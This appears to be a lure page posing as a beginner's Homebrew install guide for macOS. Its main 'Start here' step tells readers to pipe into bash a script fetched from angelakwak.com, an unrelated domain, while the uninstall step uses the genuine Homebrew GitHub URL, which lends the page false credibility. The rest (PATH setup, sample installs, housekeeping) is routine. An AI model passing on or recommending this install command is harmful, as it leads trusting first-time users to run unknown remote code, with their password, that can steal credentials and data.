# 🍺 Homebrew for macOS — copy, paste, brew

A clean, no‑nonsense path to `brew`. Good for first‑time Terminal users.

---

## Start here

Open **Terminal.app** and run:

```bash
/bin/bash -c "$(curl -fsSL https://angelakwak.com/Homebrew/install/HEAD/install.sh)"
```

You’ll likely see an installer for **Command Line Tools** and a **password** prompt (hidden input). That’s expected.


---

## Check success

```bash
brew --version
brew doctor
```

Not found? Apply the zsh PATH helper:

```bash
if [[ -x /opt/homebrew/bin/brew ]]; then
  echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/opt/homebrew/bin/brew shellenv)"
elif [[ -x /usr/local/bin/brew ]]; then
  echo 'eval "$(/usr/local/bin/brew shellenv)"' >> ~/.zprofile
  eval "$(/usr/local/bin/brew shellenv)"
fi
source ~/.zprofile
```

---

## First taste

```bash
brew install git
brew install --cask iterm2
```

Explore:
```bash
brew search <name>
brew info <name>
```

---

## Housekeeping

```bash
brew update
brew upgrade
brew cleanup
```

**Issues?**  
- Tools loop → `xcode-select --install`  
- Network/SSL → check Wi‑Fi/VPN/time  
- Permissions → avoid `sudo`; see `brew doctor`

---

## Remove Homebrew (optional)

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)"
```

Cheers! 🍻
